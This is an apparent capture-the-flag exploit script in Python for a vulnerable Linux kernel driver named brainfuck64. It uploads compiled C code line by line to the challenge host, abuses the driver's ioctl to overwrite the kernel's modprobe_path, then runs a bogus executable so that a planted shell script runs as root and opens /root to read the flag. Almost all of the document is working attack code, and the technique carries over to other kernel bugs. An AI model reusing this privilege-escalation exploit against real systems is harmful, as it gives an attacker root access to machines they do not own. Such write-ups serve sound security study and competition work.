#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import os

bin_file = './run.sh'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'PROC', remote = 'SOCKET')
env.set_item('target',  local   = {'argv':[bin_file]}, \
                        remote  = {'host':'brainfuck64-01.pwn.beer', 'port':31337})
env.select()

#==========

def attack(conn, **kwargs):
    exploit = generate_exploit()

    for s in [exploit[i: i+0x80] for i in range(0, len(exploit), 0x80)]:
        conn.sendlineafter('$', 'echo {} >> exploit.b64'.format(s)) 

    conn.sendlineafter('$', 'base64 -d exploit.b64 > exploit'.format(exploit)) 
    conn.sendlineafter('$', 'chmod +x exploit') 

    conn.sendlineafter('$', 'echo -ne "#!/bin/sh\nchmod o+rx -R /root\n" > ex.sh') 
    conn.sendlineafter('$', 'chmod +x ex.sh') 

    conn.sendlineafter('$', 'echo -ne "\\xff\\xff\\xff\\xff" > a') 
    conn.sendlineafter('$', 'chmod +x a') 

    conn.sendlineafter('$', './exploit') 
    conn.sendlineafter('$', './a') 
    conn.sendlineafter('$', 'cat /root/flag') 

def generate_exploit():
    code = '''
// gcc exploit_minimal.c -masm=intel -fno-PIE -nostdlib -no-pie -o exploit
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>

size_t read(int fd, void *buf, size_t count);
size_t write(int fd, void *buf, size_t count);
int open(const char* pathname, int flags, ...);
int close(int fd);
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int mprotect(void *addr, size_t len, int prot);
int munmap(void *addr, size_t length);
int ioctl(int fd, unsigned long request, ...);
int execve(const char *filename, char *const argv[], char *const envp[]);
void exit(int status);

/* exploit */
unsigned long modprobe_path 	= 0xffffffff81a3f7a0;

struct info {
	unsigned long magic;
	unsigned long size;
};

#define BF_RUN		0xbaadc0d3
#define BF_READ		0xd00dc0d3
#define BF_WRITE	0xac1dc0d3

void _start(void){
	int fd;
	struct info info;
	char code[500] = "<<<<<<<<^AAAAAAAA^/home/us^er/ex.sh";
	unsigned long buf[0x20/sizeof(long)];

	if((fd = open("/dev/brainfuck64", O_RDWR)) < 0){
		exit(-1);
	}

	info.magic = 0x34364642;
	info.size = sizeof(buf);
	write(fd, &info, sizeof(info));

	read(fd, buf, sizeof(buf));

	*(unsigned long*)&code[9] = modprobe_path - 8;
	ioctl(fd, BF_RUN, code);

	read(fd, buf, sizeof(buf));
	close(fd);

	exit(0);
}

asm(
"read:\\n"
"mov rax, 0\\n"
"syscall\\n"
"ret\\n"

"write:\\n"
"mov rax, 1\\n"
"syscall\\n"
"ret\\n"

"open:\\n"
"mov rax, 2\\n"
"syscall\\n"
"ret\\n"

"close:\\n"
"mov rax, 3\\n"
"syscall\\n"
"ret\\n"

"mmap:\\n"
"mov rax, 9\\n"
"mov r10, rcx\\n"
"syscall\\n"
"ret\\n"

"mprotect:\\n"
"mov rax, 10\\n"
"syscall\\n"
"ret\\n"

"munmap:\\n"
"mov rax, 11\\n"
"syscall\\n"
"ret\\n"

"ioctl:\\n"
"mov rax, 16\\n"
"syscall\\n"
"ret\\n"

"execve:\\n"
"mov rax, 59\\n"
"syscall\\n"
"ret\\n"

"exit:\\n"
"mov rax, 60\\n"
"syscall\\n"
);
    '''

    program = tempfile.mktemp()
    source  = program + ".c"
    write(source, code)

    process('gcc {} -masm=intel -fno-PIE -nostdlib -no-pie -o {}'.format(source, program).split()).wait_for_close()
    exploit = base64.b64encode(open(program).read())

    os.unlink(program)
    os.unlink(source)

    return exploit

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
